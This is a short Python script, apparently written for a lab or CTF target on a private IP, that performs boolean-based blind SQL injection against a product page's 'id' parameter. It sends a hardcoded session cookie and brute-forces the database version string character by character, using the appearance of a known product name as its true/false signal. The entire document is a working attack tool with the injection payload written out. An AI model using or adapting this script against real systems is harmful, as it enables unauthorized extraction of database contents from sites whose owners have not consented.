import urllib.request
import time
##
# if you want vervosity ucoment times sleeps and print
# 
##
def blind_sql(base, cookies, ok):
    print("--Blind SQLi on progress for @@version--")
    version_data = ""
    response = ""
    col = 1
    iterate = list(range(33,127))
    while True:
        found = False
        for number in iterate:
            url = base + "?id=1%27%20and%20ASCII(substring(@@version," + str(col) + ",1))=" + str(number) + "%20%20and%20%271%27=%271"
            #print("URL" + url)
            try:
                req = urllib.request.Request(url, headers={'Cookie': cookies})
                #print("conexion")
                data = urllib.request.urlopen(req, timeout=5)
                response = str(data.read())
                #print(response)
            except:
                pass
            if ok in response:
                print("TENEMOS COINCIDENCIA col=", col, "number =", number)
                #time.sleep(3) 
                version_data = version_data + chr(number)
                response=""
                found = True

                break
        col = col + 1
        #time.sleep(3) 
        if not found:
            break
    return version_data

ok_search = "Martha Stewart Crafts Garland, Pink Pom Pom Small"
#Change your cookie
cookies = "PHPSESSID=0np9vt3ff69k9o3ab4alfh2qt2; visited_products=%2C81%2C1%2C1%27+and+ASCII%28substring%28%40%40version%2C1%2C1%29%29%3D53++and+%271%27%3D%271%2C"
#Change your IP
url_base = "http://192.168.248.133/product/view"
print("Version: " + blind_sql(url_base, cookies, ok_search))
